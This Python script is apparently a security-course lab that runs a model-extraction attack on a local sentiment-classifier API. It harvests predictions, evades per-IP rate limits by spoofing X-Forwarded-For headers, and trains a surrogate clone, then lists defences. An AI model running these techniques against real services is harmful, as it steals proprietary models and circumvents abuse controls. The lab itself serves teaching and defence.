#!/usr/bin/env python3
"""
Lab 06 - Model Extraction Attack

This script demonstrates a model extraction (model stealing) attack against the
target sentiment classifier API. The attack proceeds in phases:

  1. Reconnaissance  -- Gather model metadata from /model-info
  2. Query harvest   -- Send diverse texts to /predict, collecting labels and
                        confidence scores
  3. Rate limit demo -- Show rate limiting being hit, then bypass it with
                        X-Forwarded-For spoofing
  4. Surrogate train -- Train a local clone (TF-IDF + LogisticRegression) on
                        the stolen input-output pairs
  5. Fidelity eval   -- Measure how closely the surrogate agrees with the
                        target on a held-out test set

Educational purpose only. Do NOT use these techniques against real systems
without authorisation.
"""

import random
import time
import json
import sys

import requests
import numpy as np
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.pipeline import Pipeline
from sklearn.metrics import accuracy_score, classification_report

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

TARGET_URL = "http://localhost:5000"

# Diverse query corpus for probing the target model.
# A real attacker would generate far more samples, possibly using an LLM to
# create diverse phrasing across all classes.
QUERY_TEXTS = [
    # Positive-leaning
    "I really enjoyed using this product, it was a great experience",
    "Excellent quality and fast delivery",
    "Love the new features, very intuitive design",
    "Best thing I bought this year hands down",
    "Very helpful customer support team",
    "The update improved performance dramatically",
    "Beautiful packaging and the item was exactly as shown",
    "I would recommend this to all my friends",
    "Outstanding results after using it for a month",
    "High quality materials and excellent craftsmanship",
    "Makes my daily routine so much easier",
    "Impressed by how well made this is",
    "The service was fast and very professional",
    "Everything worked perfectly out of the box",
    "Great value, exceeds the price point",
    "A truly wonderful experience from beginning to end",
    "The team clearly put a lot of care into this product",
    "Could not be happier with my purchase",
    "The new version is leagues better than the old one",
    "Top quality item, extremely satisfied",
    # Negative-leaning
    "This was a waste of money, very poor quality",
    "Terrible experience, I want a full refund",
    "Broken on arrival and customer service was useless",
    "Would not recommend to anyone, very disappointed",
    "The product stopped working after just two days",
    "Cheap materials that fell apart immediately",
    "Completely misleading product description",
    "The worst purchase I have made in a long time",
    "Rude staff and extremely slow service",
    "Nothing about this product meets its claims",
    "Arrived late and in terrible condition",
    "I regret every penny spent on this item",
    "Unreliable product that fails when you need it most",
    "Defective and the company will not honour the warranty",
    "Do yourself a favour and avoid this product",
    "This thing is garbage, total scam",
    "Frustrating setup process and buggy software",
    "The quality has declined significantly since last year",
    "Overpriced and underdelivers on every promise",
    "An absolutely dreadful customer experience",
    # Neutral-leaning
    "The product is fine, nothing particularly special",
    "Decent for the price but not outstanding",
    "It does what it says, adequate for basic needs",
    "Average quality, similar to other options on the market",
    "No complaints but nothing impressive either",
    "Standard product, met my minimum expectations",
    "It works but I have seen better alternatives",
    "Fair value, roughly what I expected",
    "Some parts are good, some could be improved",
    "Ordinary product with average build quality",
    "Functional but not something I would go out of my way to buy",
    "It gets the job done but that is about it",
    "Middle of the road, neither good nor bad",
    "Packaging was fine and the product is acceptable",
    "Not great not terrible, just average",
    "Received the item, it looks like the description",
    "Works as intended, no surprises",
    "Reasonable quality for an entry level product",
    "A basic product that serves its purpose",
    "Nothing to complain about but nothing to praise either",
    # Ambiguous / edge cases (useful for extraction -- model boundaries)
    "I guess it is okay but I expected more",
    "Not bad but could be better",
    "Surprisingly decent after low expectations",
    "Had mixed feelings about this purchase",
    "Started great but quality declined over time",
    "The product itself is fine but the shipping was awful",
    "Good concept but poor execution",
    "It has potential but falls short in key areas",
    "Some days I like it, some days I regret buying it",
    "Interesting product but overpriced for what it is",
]

# Held-out texts for evaluating extraction fidelity
HOLDOUT_TEXTS = [
    "Absolutely wonderful, exceeded all expectations",
    "Terrible quality, completely useless product",
    "It is an average product, nothing remarkable",
    "Best customer service experience I have ever had",
    "Broke within hours and they would not replace it",
    "Does what it is supposed to do, fairly standard",
    "I am delighted with this purchase",
    "An utter disappointment from start to finish",
    "Seems okay, will update my review after more use",
    "Incredible value, highly recommended",
    "The product arrived broken and nobody cared",
    "Meets expectations, no more no less",
    "Superb craftsmanship and beautiful design",
    "Waste of time and money, avoid this seller",
    "It is passable but I would not buy it again",
    "Phenomenal performance, a real game changer",
    "Horribly designed and poorly manufactured",
    "A perfectly adequate product for the price",
    "This is my new favourite gadget, love everything about it",
    "Pathetic excuse for a product, demand a refund",
]


def banner(text: str) -> None:
    """Print a visible banner."""
    line = "=" * 70
    print(f"\n{line}")
    print(f"  {text}")
    print(f"{line}\n")


# ---------------------------------------------------------------------------
# Phase 1: Reconnaissance
# ---------------------------------------------------------------------------

def phase_reconnaissance() -> dict:
    """
    Gather publicly available model metadata.
    In a real attack this would help choose surrogate architecture.
    """
    banner("PHASE 1: Reconnaissance")

    # Check health
    print("[*] Checking target health ...")
    resp = requests.get(f"{TARGET_URL}/health", timeout=10)
    print(f"    Status: {resp.json()}")

    # Gather model info -- the target leaks useful metadata
    print("\n[*] Querying /model-info for metadata ...")
    resp = requests.get(f"{TARGET_URL}/model-info", timeout=10)
    info = resp.json()
    print(f"    Model type       : {info.get('model_type')}")
    print(f"    Framework        : {info.get('framework')}")
    print(f"    Pipeline steps   : {info.get('pipeline_steps')}")
    print(f"    Number of classes: {info.get('num_classes')}")
    print(f"    Class names      : {info.get('class_names')}")
    print(f"    Vocabulary size  : {info.get('vocabulary_size')}")
    print(f"    Ngram range      : {info.get('ngram_range')}")

    # Check rate limit status -- information disclosure vulnerability
    print("\n[*] Querying /rate-limit-status ...")
    resp = requests.get(f"{TARGET_URL}/rate-limit-status", timeout=10)
    rl = resp.json()
    print(f"    IP seen as       : {rl.get('ip_identified_as')}")
    print(f"    IP source        : {rl.get('ip_source')}")
    print(f"    Limit            : {rl.get('limit')} requests / {rl.get('window_seconds')}s")

    print("\n[+] Reconnaissance complete. The target leaks model architecture,")
    print("    class labels, and rate limit internals -- all useful for extraction.")
    return info


# ---------------------------------------------------------------------------
# Phase 2: Query the target and collect input-output pairs
# ---------------------------------------------------------------------------

def phase_query_harvest(texts: list[str]) -> tuple[list[str], list[str], list[dict]]:
    """
    Send texts to the target /predict endpoint and collect the responses.
    Returns (texts, labels, probability_dicts).
    """
    banner("PHASE 2: Query Harvest -- Collecting Model Outputs")

    labels = []
    probs = []
    successful_texts = []
    rate_limited_count = 0

    print(f"[*] Sending {len(texts)} queries to /predict ...")
    for i, text in enumerate(texts):
        try:
            resp = requests.post(
                f"{TARGET_URL}/predict",
                json={"text": text},
                timeout=10,
            )
            if resp.status_code == 429:
                rate_limited_count += 1
                # We will handle this in Phase 3
                continue

            data = resp.json()
            successful_texts.append(text)
            labels.append(data["prediction"])
            probs.append(data["probabilities"])

            if (i + 1) % 20 == 0:
                print(f"    ... {i + 1}/{len(texts)} queries sent "
                      f"(rate limited: {rate_limited_count})")
        except requests.exceptions.RequestException as e:
            print(f"    [!] Query {i} failed: {e}")

    print(f"\n[+] Collected {len(successful_texts)} labelled samples.")
    if rate_limited_count > 0:
        print(f"[!] Hit rate limit {rate_limited_count} times.")
    return successful_texts, labels, probs


# ---------------------------------------------------------------------------
# Phase 3: Demonstrate rate limit bypass via X-Forwarded-For
# ---------------------------------------------------------------------------

def phase_rate_limit_bypass(remaining_texts: list[str]) -> tuple[list[str], list[str], list[dict]]:
    """
    Show the rate limit bypass by spoofing X-Forwarded-For headers.
    Each request uses a different fake IP to get a fresh rate limit bucket.
    """
    banner("PHASE 3: Rate Limit Bypass via X-Forwarded-For Spoofing")

    print("[*] Demonstrating that we can bypass rate limits by spoofing IPs ...")
    print("    The /rate-limit-status endpoint told us that X-Forwarded-For")
    print("    is trusted for IP identification. We abuse this now.\n")

    labels = []
    probs = []
    successful_texts = []

    for i, text in enumerate(remaining_texts):
        # Generate a fake IP for each request
        fake_ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        headers = {"X-Forwarded-For": fake_ip}

        try:
            resp = requests.post(
                f"{TARGET_URL}/predict",
                json={"text": text},
                headers=headers,
                timeout=10,
            )
            if resp.status_code == 429:
                # Should not happen with spoofed IPs, but handle gracefully
                print(f"    [!] Still rate limited even with spoofed IP {fake_ip}")
                continue

            data = resp.json()
            successful_texts.append(text)
            labels.append(data["prediction"])
            probs.append(data["probabilities"])

        except requests.exceptions.RequestException as e:
            print(f"    [!] Request failed: {e}")

    print(f"[+] Bypassed rate limit and collected {len(successful_texts)} additional samples.")
    print(f"    Used spoofed IPs to avoid per-IP rate limiting.\n")

    # Show that rate limit on our real IP is still exhausted, while spoofed
    # IPs have fresh limits
    print("[*] Verifying: our real IP is still rate-limited ...")
    resp = requests.get(f"{TARGET_URL}/rate-limit-status", timeout=10)
    print(f"    Real IP status: {json.dumps(resp.json(), indent=2)}")

    fake_ip = "192.168.99.99"
    resp = requests.get(
        f"{TARGET_URL}/rate-limit-status",
        headers={"X-Forwarded-For": fake_ip},
        timeout=10,
    )
    print(f"\n    Spoofed IP ({fake_ip}) status: {json.dumps(resp.json(), indent=2)}")

    return successful_texts, labels, probs


# ---------------------------------------------------------------------------
# Phase 4: Train surrogate model
# ---------------------------------------------------------------------------

def phase_train_surrogate(
    texts: list[str], labels: list[str]
) -> Pipeline:
    """
    Train a surrogate model on the stolen input-output pairs.
    We use the same architecture revealed by /model-info.
    """
    banner("PHASE 4: Training Surrogate Model")

    print(f"[*] Training data: {len(texts)} samples")
    unique_labels = sorted(set(labels))
    for lbl in unique_labels:
        count = labels.count(lbl)
        print(f"    - {lbl}: {count} samples")

    # Build the same pipeline the target uses (we know from /model-info)
    surrogate = Pipeline([
        ("tfidf", TfidfVectorizer(
            max_features=5000,
            ngram_range=(1, 2),
            stop_words="english",
            sublinear_tf=True,
        )),
        ("clf", LogisticRegression(
            C=1.0,
            max_iter=1000,
            solver="lbfgs",
            multi_class="multinomial",
            random_state=42,
        )),
    ])

    surrogate.fit(texts, labels)
    print("[+] Surrogate model trained successfully.\n")

    # Self-evaluation on training data (sanity check)
    train_preds = surrogate.predict(texts)
    train_acc = accuracy_score(labels, train_preds)
    print(f"    Surrogate training accuracy: {train_acc:.2%}")

    return surrogate


# ---------------------------------------------------------------------------
# Phase 5: Evaluate extraction fidelity
# ---------------------------------------------------------------------------

def phase_evaluate_fidelity(surrogate: Pipeline, holdout_texts: list[str]) -> None:
    """
    Compare the surrogate and target predictions on held-out texts.
    Fidelity = % agreement between surrogate and target on the same inputs.
    """
    banner("PHASE 5: Extraction Fidelity Evaluation")

    print(f"[*] Querying target with {len(holdout_texts)} held-out texts ...")

    target_labels = []
    for text in holdout_texts:
        fake_ip = f"172.16.{random.randint(0,255)}.{random.randint(1,254)}"
        resp = requests.post(
            f"{TARGET_URL}/predict",
            json={"text": text},
            headers={"X-Forwarded-For": fake_ip},
            timeout=10,
        )
        data = resp.json()
        target_labels.append(data["prediction"])

    # Surrogate predictions
    surrogate_labels = surrogate.predict(holdout_texts).tolist()

    # Fidelity: agreement between surrogate and target
    agreements = sum(1 for t, s in zip(target_labels, surrogate_labels) if t == s)
    fidelity = agreements / len(holdout_texts)

    print(f"\n[+] Results on {len(holdout_texts)} held-out samples:\n")
    print(f"    {'Text (truncated)':<50} {'Target':<12} {'Surrogate':<12} {'Match'}")
    print(f"    {'-'*50} {'-'*12} {'-'*12} {'-'*5}")

    for text, tgt, sur in zip(holdout_texts, target_labels, surrogate_labels):
        match_str = "YES" if tgt == sur else "NO"
        print(f"    {text[:48]:<50} {tgt:<12} {sur:<12} {match_str}")

    print(f"\n    =============================================")
    print(f"    EXTRACTION FIDELITY: {fidelity:.1%} ({agreements}/{len(holdout_texts)})")
    print(f"    =============================================\n")

    if fidelity >= 0.8:
        print("    [!] HIGH fidelity -- the surrogate closely replicates the target.")
        print("        An attacker can now use this model without paying for API access,")
        print("        or use it as a white-box model to craft adversarial examples.")
    elif fidelity >= 0.6:
        print("    [*] MODERATE fidelity -- the surrogate partially replicates the target.")
        print("        More query data would likely improve the clone.")
    else:
        print("    [-] LOW fidelity -- the surrogate diverges from the target.")
        print("        The attacker needs more diverse queries or a different architecture.")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    print("\n" + "#" * 70)
    print("#  Lab 06 -- Model Extraction Attack")
    print("#  Educational demonstration of model stealing")
    print("#" * 70)

    # Phase 1: Reconnaissance
    model_info = phase_reconnaissance()

    # Phase 2: Query the target (may hit rate limits)
    all_queries = QUERY_TEXTS.copy()
    random.shuffle(all_queries)
    harvested_texts, harvested_labels, harvested_probs = phase_query_harvest(all_queries)

    # Phase 3: Bypass rate limits to collect any remaining samples
    # Also send some extra queries via spoofed IPs
    extra_queries = [
        "This is absolutely fantastic, I love it",
        "Terrible quality, do not buy",
        "It is an acceptable product for the price",
        "Incredible performance, could not ask for more",
        "Broken and useless, worst purchase ever",
        "Pretty standard, meets basic needs",
        "A delightful surprise, well worth the money",
        "Frustrating and poorly designed",
        "Neither good nor bad, just average",
        "I am completely blown away by the quality",
    ]
    bypass_texts, bypass_labels, bypass_probs = phase_rate_limit_bypass(extra_queries)

    # Combine all harvested data
    all_texts = harvested_texts + bypass_texts
    all_labels = harvested_labels + bypass_labels

    print(f"\n[*] Total samples collected: {len(all_texts)}")

    # Phase 4: Train the surrogate
    if len(all_texts) < 5:
        print("[!] Too few samples collected. Is the target API running?")
        sys.exit(1)

    surrogate = phase_train_surrogate(all_texts, all_labels)

    # Phase 5: Evaluate fidelity
    phase_evaluate_fidelity(surrogate, HOLDOUT_TEXTS)

    banner("ATTACK COMPLETE")
    print("Summary:")
    print(f"  - Total queries sent     : {len(all_texts) + len(HOLDOUT_TEXTS)}")
    print(f"  - Training samples stolen: {len(all_texts)}")
    print(f"  - Surrogate architecture : TF-IDF + LogisticRegression (from /model-info)")
    print(f"  - Rate limit bypassed    : YES (X-Forwarded-For spoofing)")
    print()
    print("Defences that would have helped:")
    print("  1. Do not return full probability distributions (only labels)")
    print("  2. Add output perturbation / noise to confidence scores")
    print("  3. Validate X-Forwarded-For against a trusted proxy list")
    print("  4. Use API keys + per-account rate limiting (not per-IP)")
    print("  5. Monitor for systematic querying patterns (extraction detection)")
    print("  6. Watermark model outputs for provenance tracking")
    print()


if __name__ == "__main__":
    main()
